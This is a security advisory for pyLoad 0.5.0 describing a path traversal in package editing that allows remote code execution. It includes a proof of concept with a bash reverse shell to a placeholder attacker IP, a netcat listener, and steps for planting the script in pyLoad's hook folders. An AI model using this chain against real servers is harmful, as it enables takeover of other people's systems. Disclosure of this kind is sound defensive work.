# Download to arbitrary folder can lead to RCE

## Package

pyLoad

## Affected versions

0.5.0

## Patched versions

0.5.0b3.dev75

## Description

### Summary

I found a security issue with pyLoad 0.5.0 where a web UI user can store files anywhere on the pyLoad server and gain command execution by abusing scripts.

### Details

When a user creates a new package, a subdirectory is created within the /downloads folder to store files. This new directory name is derived from the package name, except a filter is applied to make sure it can't traverse directories and stays within /downloads.

src/pyload/core/api/**init**.py::add\_package::L432

```
  folder = (
      folder.replace("http://", "")
      .replace("https://", "")
      .replace(":", "")
      .replace("/", "_")
      .replace("\\", "_")
  )
```

So if a package were created with the name `"../"` the application would instead create the folder `"/downloads/.._/"`

However, when editing packages there is no prevention in place and a user can just pick any arbitrary directory in the filesystem.

src/pyload/webui/app/blueprints/json\_blueprint.py::edit\_package::L195

```
  id = int(flask.request.form["pack_id"])
  data = {
      "name": flask.request.form["pack_name"],
      "_folder": flask.request.form["pack_folder"],
      "password": flask.request.form["pack_pws"],
  }

  api.set_package_data(id, data)
```
### Steps to reproduce

1. Login to a pyLoad instance
2. Go to "Queue" and create a new package with any name and a valid link
3. Click "Edit Package" on the newly created package and set the folder as "/config/scripts/download\_finished/"
4. Restart the package
5. Check the server filesystem and note the link was downloaded and stored inside "/config/scripts/download\_finished/"

### Remote code execution proof-of-concept

It is possible to use this issue to abuse scripts and gain remote control over the pyLoad server.

#### On attacker machine

1. Start a web server hosting a malicious script

```
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker_ip>/9999 0>&1' > evil.sh&1
sudo python3 -m http.server 80
```

2. Start netcat listener for reverse shells

```
nc -vklp 9999
```
#### On pyLoad

1. Change pyLoad file permission settings

   Change permissions of downloads: On

   Permission mode for downloaded files: 0744
2. Create a package with link pointing to the attacker

   http://<attacker\_ip>/evil.sh
3. Edit package and change folder to /config/scripts/package\_deleted/
4. Refresh package. Wait up to 60 seconds for scripts to be processed by pyLoad
5. Delete any package package to trigger the script

### Impact

An authenticated user can gain control over the underlying pyLoad server.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
